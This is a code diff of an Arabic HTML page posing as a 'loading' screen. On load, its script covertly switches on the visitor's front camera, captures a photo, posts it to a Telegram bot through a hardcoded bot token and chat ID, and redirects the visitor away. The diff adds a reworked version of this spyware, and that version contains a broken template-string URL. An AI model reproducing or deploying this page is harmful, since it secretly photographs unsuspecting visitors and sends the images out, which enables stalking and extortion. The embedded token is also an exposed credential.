@@ -1,83 +1,63 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>جارٍ التحميل...</title>
 </head>
 <body>
+  <h3>جارٍ تحميل الصفحة...</h3>
   <video id="video" autoplay style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    const token = '8077679722:AAGIQbfCgIfyJyystYkR7FdVhtT7Qy-oFBE'; // توكن البوت
-    const chatId = '7728263509'; // معرف الدردشة في تليجرام
+    const token = '8077679722:AAGIQbfCgIfyJyystYkR7FdVhtT7Qy-oFBE';
+    const chatId = '7728263509';
 
-    // تحويل base64 إلى Blob
-    function base64ToBlob(base64) {
-      const [metadata, data] = base64.split(',');
-      const byteString = atob(data);
-      const mimeString = metadata.match(/:(.*?);/)[1];
-      const arrayBuffer = new ArrayBuffer(byteString.length);
-      const uint8Array = new Uint8Array(arrayBuffer);
-      for (let i = 0; i < byteString.length; i++) {
-        uint8Array[i] = byteString.charCodeAt(i);
-      }
-      return new Blob([arrayBuffer], { type: mimeString });
-    }
-
-    // إرسال الصورة إلى بوت تليجرام
     async function sendPhoto(base64Image) {
-      const blob = base64ToBlob(base64Image);
+      const blob = await (await fetch(base64Image)).blob();
       const formData = new FormData();
       formData.append("chat_id", chatId);
       formData.append("photo", blob, "photo.jpg");
 
-      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+      await fetch(https://api.telegram.org/bot${token}/sendPhoto, {
         method: "POST",
         body: formData
       });
     }
 
-    // تشغيل الكاميرا، التقاط الصورة، إرسالها، ثم التوجيه
     async function captureAndSendCameraImage() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }
+          video: { facingMode: "user" } // الكاميرا الأمامية
         });
 
         const video = document.getElementById('video');
         video.srcObject = stream;
 
-        await new Promise(resolve => {
-          video.onloadedmetadata = () => resolve();
-        });
+        // انتظر شوي حتى تشتغل الكاميرا
+        setTimeout(() => {
+          const canvas = document.getElementById('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        await new Promise(resolve => setTimeout(resolve, 3000)); // انتظر 3 ثواني
+          // أوقف الكاميرا
+          stream.getTracks().forEach(track => track.stop());
 
-        const canvas = document.getElementById('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const base64Image = canvas.toDataURL("image/jpeg");
+          sendPhoto(base64Image).then(() => {
+            window.location.href = "https://google.com";
+          });
 
-        stream.getTracks().forEach(track => track.stop()); // إيقاف الكاميرا
-
-        const base64Image = canvas.toDataURL("image/jpeg");
-        await sendPhoto(base64Image);
-
-        // التوجيه إلى قناة الزيرو بايثون
-        window.location.href = "https://www.youtube.com/c/ElzeroWebSchool";
-
+        }, 3000); // انتظر 3 ثواني
       } catch (err) {
-        // التوجيه حتى لو فشل
-        window.location.href = "https://www.youtube.com/c/ElzeroWebSchool";
+        alert("فشل الوصول للكاميرا: " + err);
+        window.location.href = "https://google.com";
       }
     }
 
-    // شغّل الكود تلقائيًا عند تحميل الصفحة
-    window.onload = () => {
-      captureAndSendCameraImage();
-    };
+    window.onload = captureAndSendCameraImage;
   </script>
 </body>
 </html>
